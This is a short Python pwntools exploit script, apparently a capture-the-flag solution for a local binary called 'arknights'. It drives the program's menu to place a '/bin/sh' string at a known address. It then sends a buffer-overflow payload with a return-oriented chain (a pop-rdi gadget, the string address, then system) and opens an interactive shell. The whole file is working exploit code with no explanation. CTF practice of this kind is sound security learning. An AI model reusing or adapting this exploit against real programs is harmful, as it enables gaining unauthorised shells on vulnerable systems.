from pwn import *
r = process("./arknights")
context.log_level = 'debug'

rdi = 0x401935
ret = 0x40101a
system = 0x401785
count = 0x405B60  # binsh

payload = b'a'*0x48+p64(rdi)+p64(count)+p64(system)


def ck(n):
    r.recv()
    r.sendline(b'3')
    r.recv()
    r.sendline(str(n).encode())
    r.sendline(b'\n')


r.sendline(b'a')
ck(10000)
ck(10000)
ck(6739)

r.recv()
r.sendline(b'4')
r.recv()
r.sendline(b'1')
r.sendline(payload)

r.interactive()
